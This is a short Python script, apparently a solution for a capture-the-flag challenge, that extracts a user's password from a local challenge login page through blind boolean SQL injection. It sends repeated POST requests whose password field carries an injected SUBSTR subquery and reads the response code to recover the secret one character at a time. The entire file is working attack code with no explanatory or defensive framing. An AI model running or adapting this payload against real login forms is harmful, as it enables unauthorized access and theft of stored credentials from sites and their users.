import argparse
import string
import sys

import requests

URL = "http://challenge.localhost/"
GREEN = "\033[0;32m"
RED = "\033[0;31m"
ENDCOLOR = "\033[0m"


def main():
    alphabet = string.ascii_letters + string.digits + string.punctuation
    password = ""
    match = True
    index = 1

    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--user", default="")
    parser.add_argument("-t", "--table", default="")

    args = parser.parse_args()

    user = args.user
    table = args.table

    if user == "" or table == "":
        print(f"[!] Usage: python {sys.argv[0]} -u <USER> -t <TABLE>")
        sys.exit(-1)

    print(f"\r\n{GREEN}[+] Password:{ENDCOLOR} {password}", end="")

    try:
        while match:
            print(f"\r{GREEN}[+] Password:{ENDCOLOR} {password}", end="")
            for char in alphabet:
                data = {
                    "username": f"{user}",
                    "password": f"nonexistant' OR SUBSTR((SELECT password FROM {table} WHERE username = '{user}'), {index}, 1) = '{char}'-- -",
                }
                r = requests.post(URL, data=data)

                # Condition for match
                if r.status_code != 403:
                    match = True
                    password += char
                    index += 1
                    break

                match = False

    except KeyboardInterrupt:
        print(f"\n\n{RED}[-]{ENDCOLOR} User Interrupted")


if __name__ == "__main__":
    main()
